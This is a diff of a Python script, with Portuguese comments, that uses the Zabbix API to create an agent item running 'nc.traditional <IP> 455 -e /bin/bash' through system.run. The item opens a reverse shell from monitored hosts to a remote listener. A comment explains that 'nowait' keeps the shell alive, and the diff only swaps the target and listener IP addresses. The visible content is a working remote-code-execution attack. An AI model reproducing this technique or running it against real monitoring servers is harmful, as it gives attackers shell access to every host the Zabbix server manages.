@@ -40,7 +40,7 @@ def write_code_in_host(auth_token,hostid,interfaceid):
         "params": {
             "name": "nc trad",
             #nowait tira o tempo para que a shell não caia
-            "key_": "system.run[nc.traditional 192.168.29.11 455 -e /bin/bash ,nowait]",
+            "key_": "system.run[nc.traditional 10.168.2.11 455 -e /bin/bash ,nowait]",
             "hostid": hostid,
             "type": 0,  # Zabbix agent
             "value_type": 3,  # Tipo de retorno (3 significa log)
@@ -59,7 +59,7 @@ def write_code_in_host(auth_token,hostid,interfaceid):
 listar_interface_host(auth_token)
 #listar_interface_host traz o resultado do hostid e  interfaceid para executar no agent
 #exemplo de saida = Response text: {"jsonrpc":"2.0","result":[{"hostid":"10084","host":"Zabbix server","interfaces":[{"interfaceid":"1","ip":"127.0.0.1"}]},
-# {"hostid":"10634","host":"agent1","interfaces":[{"interfaceid":"31","ip":"192.168.29.10"}]}],"id":2}
+# {"hostid":"10634","host":"agent1","interfaces":[{"interfaceid":"31","ip":"10.168.2.11"}]}],"id":2}
 hostid=""
 interfaceid=""
 # write_code_in_host(auth_token,hostid)
